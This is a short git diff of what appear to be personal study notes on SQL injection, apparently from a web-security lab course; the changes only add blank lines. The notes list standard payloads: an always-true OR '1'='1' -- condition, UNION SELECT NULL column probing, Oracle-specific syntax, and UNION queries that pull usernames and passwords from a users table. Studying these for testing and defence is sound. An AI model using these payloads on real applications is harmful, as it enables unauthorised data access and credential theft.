@@ -10,6 +10,7 @@ SQL injection common occurrences location:
 
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
 `OR '1'='1' --`
+
 `SELECT * FROM products WHERE category = 'Gifts' OR'1'='1' -- AND released = 1`
 
 `Union` attacks allows us to execute one or more `SELECT` queries and append result to original query.
@@ -17,19 +18,25 @@ SQL injection common occurrences location:
 `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
 
 Find number of columns in using UNION.
+
 `UNION SELECT NULL-- `
 
 DB specific syntax.
+
 Oracle -> `' UNION SELECT NULL FROM DUAL--`
 
 Find column to a data type
+
 `' UNION SELECT NULL,'a',NULL,NULL--`
+
 `' UNION select NULL, 'CqPDHh', NULL  --`
 
 Combining Union to retrieve data.
+
 `'UNION SELECT username,password from users`
 
 Retrieving multiple value within a single column
+
 `' UNION SELECT username || '~' || password FROM users--`
 
 
